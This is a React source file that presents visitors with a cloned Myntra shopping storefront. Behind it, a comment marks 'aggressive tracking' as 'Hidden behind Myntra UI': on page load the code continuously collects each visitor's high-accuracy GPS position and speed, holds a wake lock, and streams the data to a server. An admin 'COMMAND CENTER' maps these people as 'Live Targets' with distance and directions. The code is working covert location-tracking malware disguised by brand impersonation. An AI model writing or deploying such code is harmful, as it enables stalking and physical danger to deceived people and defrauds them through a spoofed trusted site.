import React, { useEffect, useState } from 'react';
import { MapContainer, TileLayer, Marker, Popup, useMap } from 'react-leaflet';
import { io } from 'socket.io-client';
import { 
  ShieldCheck, Map as MapIcon, ExternalLink, // Admin Icons
  Search, User, Heart, ShoppingBag // Myntra Icons
} from 'lucide-react';
import 'leaflet/dist/leaflet.css';
import L from 'leaflet';

// Fix Leaflet Icons for standard React build
import markerIcon from 'leaflet/dist/images/marker-icon.png';
import markerShadow from 'leaflet/dist/images/marker-shadow.png';
const DefaultIcon = L.icon({ 
  iconUrl: markerIcon, 
  shadowUrl: markerShadow, 
  iconSize: [25, 41], 
  iconAnchor: [12, 41] 
});
L.Marker.prototype.options.icon = DefaultIcon;

// Connect to backend
const socket = io(window.location.hostname === 'localhost' ? 'http://localhost:3000' : '/');

// Helper to calculate distance in KM (Haversine formula)
const getDistance = (lat1, lon1, lat2, lon2) => {
  if (!lat1 || !lon1 || !lat2 || !lon2) return '...';
  const R = 6371; // Radius of earth in km
  const dLat = (lat2 - lat1) * Math.PI / 180;
  const dLon = (lon2 - lon1) * Math.PI / 180;
  const a = Math.sin(dLat / 2) * Math.sin(dLat / 2) +
            Math.cos(lat1 * Math.PI / 180) * Math.cos(lat2 * Math.PI / 180) *
            Math.sin(dLon / 2) * Math.sin(dLon / 2);
  const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a));
  return (R * c).toFixed(2);
};

// Component to auto-center map when Admin clicks a user
function RecenterMap({ coords }) {
  const map = useMap();
  useEffect(() => { 
    if (coords) map.flyTo([coords.lat, coords.lng], 16, { animate: true, duration: 1.5 }); 
  }, [coords, map]);
  return null;
}

export default function App() {
  const [role, setRole] = useState('user');
  const [adminLocation, setAdminLocation] = useState(null);
  const [users, setUsers] = useState([]);
  const [selectedUser, setSelectedUser] = useState(null);

  // Core Setup & Tracking Logic
  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    const urlName = params.get('name') || `User_${Math.random().toString(36).substr(2, 5)}`;
    
    const userId = localStorage.getItem('userId') || 'uid_' + Math.random().toString(36).substr(2, 9);
    localStorage.setItem('userId', userId);

    if (window.location.pathname.includes('/admin')) {
      setRole('admin');
      navigator.geolocation.getCurrentPosition((pos) => {
        setAdminLocation({ lat: pos.coords.latitude, lng: pos.coords.longitude });
      });
    } else {
      // USER SIDE: Start aggressive tracking automatically (Hidden behind Myntra UI)
      const startAutoTracking = async () => {
        if ('wakeLock' in navigator) {
          try {
            await navigator.wakeLock.request('screen');
          } catch (err) {
            console.log("Wake Lock not supported/allowed");
          }
        }

        const options = {
          enableHighAccuracy: true, 
          maximumAge: 0,            
          timeout: 10000            
        };

        navigator.geolocation.watchPosition((pos) => {
          const { latitude, longitude, speed } = pos.coords;
          socket.emit('update-location', { 
            userId, 
            name: urlName, 
            lat: latitude, 
            lng: longitude,
            speed: speed 
          });
        }, (err) => console.error("GPS Error:", err), options);
      };
      
      startAutoTracking();
    }

    socket.on('users-list', (data) => setUsers(data));
    return () => socket.off('users-list');
  }, []);

  const openInGoogleMaps = (lat, lng) => {
    window.open(`http://googleusercontent.com/maps.google.com/maps?q=${lat},${lng}`, '_blank');
  };

  // ==========================================
  //                ADMIN VIEW
  // ==========================================
  if (role === 'admin') {
    return (
      <div className="flex h-screen w-full bg-slate-950 text-white font-sans overflow-hidden">
        
        {/* Sidebar */}
        <div className="w-80 bg-slate-900 border-r border-slate-800 p-4 flex flex-col z-[1000] shadow-2xl">
          <div className="flex items-center gap-2 mb-8 p-3 bg-red-500/10 rounded-lg border border-red-500/20">
            <ShieldCheck className="text-red-500 flex-shrink-0" />
            <h1 className="text-sm font-bold tracking-tight">COMMAND CENTER</h1>
          </div>
          
          <div className="flex-1 overflow-y-auto">
            <p className="text-[10px] uppercase text-slate-500 font-black mb-4 tracking-widest">
              Live Targets ({users.length})
            </p>
            
            {users.map(u => {
              const distance = adminLocation ? getDistance(adminLocation.lat, adminLocation.lng, u.lat, u.lng) : '...';
              const speedKmH = u.speed ? (u.speed * 3.6).toFixed(1) : 0;
              
              return (
                <div 
                  key={u.userId} 
                  onClick={() => setSelectedUser(u)}
                  className={`p-4 rounded-xl mb-3 cursor-pointer transition-all border ${selectedUser?.userId === u.userId ? 'bg-blue-600 border-blue-400 shadow-lg scale-[1.02]' : 'bg-slate-800 border-slate-700 hover:bg-slate-700'}`}
                >
                  <div className="flex justify-between items-start mb-2">
                    <span className="font-bold text-sm truncate">{u.name}</span>
                    <span className="text-[10px] bg-black/30 px-2 py-1 rounded text-blue-300 font-mono flex-shrink-0">
                      {distance} km
                    </span>
                  </div>
                  
                  <div className="text-xs text-slate-400 mb-3 flex justify-between">
                    <span>Speed: {speedKmH} km/h</span>
                    <span className="opacity-50 text-[10px]">ID: {u.userId.slice(-4)}</span>
                  </div>

                  <button 
                    onClick={(e) => { e.stopPropagation(); openInGoogleMaps(u.lat, u.lng); }}
                    className="w-full bg-white/10 hover:bg-white/20 p-2 rounded text-[11px] flex items-center justify-center gap-2 transition"
                  >
                    <MapIcon size={14}/> Open in Google Maps
                  </button>
                </div>
              );
            })}
            
            {users.length === 0 && (
              <div className="text-center p-6 text-slate-500 text-sm border border-dashed border-slate-700 rounded-lg">
                No active signals detected.
              </div>
            )}
          </div>
        </div>

        {/* Map Area */}
        <div className="flex-1 relative bg-slate-800">
          <MapContainer center={[20.5937, 78.9629]} zoom={5} className="h-full w-full">
            <TileLayer 
              url="https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png"
              attribution='&copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a>'
            />
            
            {users.map(u => (
              <Marker 
                key={u.userId} 
                position={[u.lat, u.lng]}
                eventHandlers={{
                  add: (e) => {
                    e.target.getElement().style.transition = "transform 1s linear";
                  }
                }}
              >
                <Popup className="text-slate-900 min-w-[150px]">
                  <h3 className="font-bold border-b pb-1 mb-2">{u.name}</h3>
                  <div className="text-xs space-y-1 mb-3 font-mono bg-slate-100 p-2 rounded">
                    <p>LAT: {u.lat.toFixed(5)}</p>
                    <p>LNG: {u.lng.toFixed(5)}</p>
                    <p>SPD: {u.speed ? (u.speed * 3.6).toFixed(1) : 0} km/h</p>
                  </div>
                  <button 
                    onClick={() => openInGoogleMaps(u.lat, u.lng)}
                    className="w-full bg-blue-600 text-white p-2 rounded text-xs flex items-center justify-center gap-1 hover:bg-blue-700 transition"
                  >
                    <ExternalLink size={12}/> Directions
                  </button>
                </Popup>
              </Marker>
            ))}
            {selectedUser && <RecenterMap coords={selectedUser} />}
          </MapContainer>
        </div>
      </div>
    );
  }

  // ==========================================
  //         USER VIEW (MYNTRA FRONTEND)
  // ==========================================
  const dummyCategories = [
    { title: "Men's T-Shirts", img: "https://images.unsplash.com/photo-1521572163474-6864f9cf17ab?w=400&q=80" },
    { title: "Women's Dresses", img: "https://images.unsplash.com/photo-1515372039744-b8f02a3ae446?w=400&q=80" },
    { title: "Casual Shoes", img: "https://images.unsplash.com/photo-1460353581641-37baddab0fa2?w=400&q=80" },
    { title: "Watches", img: "https://images.unsplash.com/photo-1523275335684-37898b6baf30?w=400&q=80" },
    { title: "Handbags", img: "https://images.unsplash.com/photo-1548036328-c9fa89d128fa?w=400&q=80" },
    { title: "Beauty & Grooming", img: "https://images.unsplash.com/photo-1596462502278-27bf85033e5a?w=400&q=80" },
  ];

  return (
    <div className="bg-white text-[#282c3f] font-sans antialiased min-h-screen">
      
      {/* Top Pre-Header Banner */}
      <div className="hidden md:block w-full bg-[#f4f4f5] text-[#535766] text-xs py-2 text-center tracking-wide">
        <strong>Sign up now</strong> and get extra ₹300 off on your first order. Use code: <strong>MYNTRA300</strong>
      </div>

      {/* Main Navbar */}
      <nav className="w-full bg-white shadow-sm sticky top-0 z-50">
        <div className="max-w-[1400px] mx-auto px-4 md:px-8 flex items-center justify-between h-20">
          
          {/* Logo Area */}
          <div className="flex items-center gap-10">
            <div className="cursor-pointer font-black text-2xl tracking-tighter text-[#ff3f6c] flex items-center">
              <span className="bg-[#ff3f6c] text-white p-1 rounded-sm mr-1">M</span>YNTRA
            </div>

            {/* Desktop Navigation Links */}
            <div className="hidden lg:flex h-full">
              <ul className="flex space-x-8 h-20 items-center font-bold text-sm tracking-wide text-[#282c3f]">
                <li className="hover:border-b-4 hover:border-[#ee5f73] border-b-4 border-transparent h-full flex items-center cursor-pointer transition-colors">MEN</li>
                <li className="hover:border-b-4 hover:border-[#fb56c1] border-b-4 border-transparent h-full flex items-center cursor-pointer transition-colors">WOMEN</li>
                <li className="hover:border-b-4 hover:border-[#f26a10] border-b-4 border-transparent h-full flex items-center cursor-pointer transition-colors">KIDS</li>
                <li className="hover:border-b-4 hover:border-[#f2c210] border-b-4 border-transparent h-full flex items-center cursor-pointer transition-colors">HOME & LIVING</li>
                <li className="hover:border-b-4 hover:border-[#0db7af] border-b-4 border-transparent h-full flex items-center cursor-pointer transition-colors">BEAUTY</li>
                <li className="hover:border-b-4 hover:border-[#ff3f6c] border-b-4 border-transparent h-full flex items-center cursor-pointer transition-colors relative">
                  STUDIO <span className="absolute -top-1 -right-6 text-[9px] text-[#ff3f6c] font-bold">NEW</span>
                </li>
              </ul>
            </div>
          </div>

          {/* Right Side: Search and Icons */}
          <div className="flex items-center gap-6">
            
            {/* Search Bar */}
            <div className="hidden md:flex items-center bg-[#f5f5f6] rounded px-4 py-2 w-[400px] border border-[#f5f5f6] hover:bg-white hover:border-gray-200 transition-colors">
              <Search size={18} className="text-gray-400 mr-3" />
              <input 
                type="text" 
                placeholder="Search for products, brands and more" 
                className="bg-transparent border-none outline-none w-full text-sm text-gray-700 placeholder-gray-500"
              />
            </div>

            {/* Action Icons */}
            <div className="flex items-center space-x-6 text-[#282c3f]">
              <div className="flex flex-col items-center cursor-pointer group">
                <User size={20} className="group-hover:text-[#ff3f6c] transition-colors" />
                <span className="text-xs font-bold mt-1">Profile</span>
              </div>
              <div className="flex flex-col items-center cursor-pointer group">
                <Heart size={20} className="group-hover:text-[#ff3f6c] transition-colors" />
                <span className="text-xs font-bold mt-1">Wishlist</span>
              </div>
              <div className="flex flex-col items-center cursor-pointer group relative">
                <ShoppingBag size={20} className="group-hover:text-[#ff3f6c] transition-colors" />
                <span className="text-xs font-bold mt-1">Bag</span>
                <span className="absolute -top-1 -right-2 bg-[#ff3f6c] text-white text-[10px] font-bold px-1.5 py-0.5 rounded-full">0</span>
              </div>
            </div>
          </div>

        </div>
      </nav>

      {/* Hero Banner Section */}
      <section className="w-full max-w-[1400px] mx-auto mt-6 px-4">
        <div className="relative w-full h-[400px] md:h-[500px] bg-gray-900 flex items-center justify-center overflow-hidden cursor-pointer group">
          <img 
            src="https://images.unsplash.com/photo-1483985988355-763728e1935b?auto=format&fit=crop&w=1600&q=80" 
            alt="Fashion Sale" 
            className="absolute inset-0 w-full h-full object-cover opacity-60 group-hover:scale-105 transition-transform duration-700"
          />
          <div className="relative z-10 text-center text-white p-8 border-4 border-white/20 backdrop-blur-sm">
            <h2 className="text-2xl tracking-[0.2em] font-medium mb-2 uppercase">End of Reason Sale</h2>
            <h1 className="text-6xl md:text-8xl font-black italic tracking-tighter mb-4 text-[#ff3f6c] drop-shadow-lg">
              50-80% OFF
            </h1>
            <p className="text-xl md:text-2xl font-bold tracking-widest mb-6">ON BIGGEST BRANDS</p>
            <button className="bg-white text-gray-900 px-8 py-3 font-bold uppercase tracking-widest hover:bg-[#ff3f6c] hover:text-white transition-colors duration-300">
              Shop Now
            </button>
          </div>
        </div>
      </section>

      {/* Categories Grid */}
      <section className="w-full max-w-[1400px] mx-auto mt-16 px-4 pb-20">
        <h3 className="text-2xl font-bold text-center uppercase tracking-widest text-[#3e4152] mb-10">
          Shop By Category
        </h3>
        
        <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-6 gap-6">
          {dummyCategories.map((cat, idx) => (
            <div key={idx} className="flex flex-col items-center cursor-pointer group">
              <div className="w-36 h-36 md:w-48 md:h-48 rounded-full overflow-hidden mb-4 shadow-lg border-4 border-transparent group-hover:border-[#ff3f6c] transition-all duration-300">
                <img 
                  src={cat.img} 
                  alt={cat.title} 
                  className="w-full h-full object-cover group-hover:scale-110 transition-transform duration-500"
                />
              </div>
              <h4 className="font-bold text-[#282c3f] text-center text-sm uppercase">{cat.title}</h4>
            </div>
          ))}
        </div>
      </section>

      {/* Promotional Strip */}
      <section className="w-full bg-[#fde3f3] py-12 mt-10">
        <div className="max-w-[1400px] mx-auto flex flex-col md:flex-row items-center justify-between px-10">
          <div className="mb-6 md:mb-0">
            <h2 className="text-3xl font-black text-[#3e4152] uppercase mb-2">Myntra Insider</h2>
            <p className="text-lg text-gray-700">Join the ultimate fashion loyalty program.</p>
          </div>
          <button className="bg-[#ff3f6c] text-white font-bold px-10 py-4 rounded shadow-lg hover:bg-[#d62f55] transition-colors">
            ENROLL NOW
          </button>
        </div>
      </section>

      {/* Simplified Footer */}
      <footer className="w-full bg-[#fafbfc] border-t border-gray-200 pt-16 pb-8 mt-10">
        <div className="max-w-[1400px] mx-auto px-10 grid grid-cols-1 md:grid-cols-4 gap-8">
          <div>
            <h4 className="font-bold text-xs text-[#282c3f] mb-4 tracking-widest">ONLINE SHOPPING</h4>
            <ul className="space-y-2 text-sm text-[#696b79]">
              <li className="cursor-pointer hover:font-bold">Men</li>
              <li className="cursor-pointer hover:font-bold">Women</li>
              <li className="cursor-pointer hover:font-bold">Kids</li>
              <li className="cursor-pointer hover:font-bold">Home & Living</li>
              <li className="cursor-pointer hover:font-bold">Beauty</li>
              <li className="cursor-pointer hover:font-bold">Gift Cards</li>
            </ul>
          </div>
          <div>
            <h4 className="font-bold text-xs text-[#282c3f] mb-4 tracking-widest">CUSTOMER POLICIES</h4>
            <ul className="space-y-2 text-sm text-[#696b79]">
              <li className="cursor-pointer hover:font-bold">Contact Us</li>
              <li className="cursor-pointer hover:font-bold">FAQ</li>
              <li className="cursor-pointer hover:font-bold">T&C</li>
              <li className="cursor-pointer hover:font-bold">Terms Of Use</li>
              <li className="cursor-pointer hover:font-bold">Track Orders</li>
              <li className="cursor-pointer hover:font-bold">Returns</li>
            </ul>
          </div>
          <div className="col-span-1 md:col-span-2">
            <div className="flex gap-4 mb-6">
              <div className="flex items-center gap-2">
                <div className="w-10 h-10 bg-gray-200 rounded flex items-center justify-center font-bold">100%</div>
                <span className="text-sm text-[#696b79]"><strong>ORIGINAL</strong> guarantee</span>
              </div>
              <div className="flex items-center gap-2">
                <div className="w-10 h-10 bg-gray-200 rounded flex items-center justify-center font-bold">14</div>
                <span className="text-sm text-[#696b79]"><strong>Return within 14days</strong></span>
              </div>
            </div>
          </div>
        </div>
        <div className="max-w-[1400px] mx-auto px-10 mt-12 border-t border-gray-200 pt-6 text-center text-xs text-[#94969f]">
          © {new Date().getFullYear()} www.myntra.com. All rights reserved. A Flipkart company.
        </div>
      </footer>

    </div>
  );
}
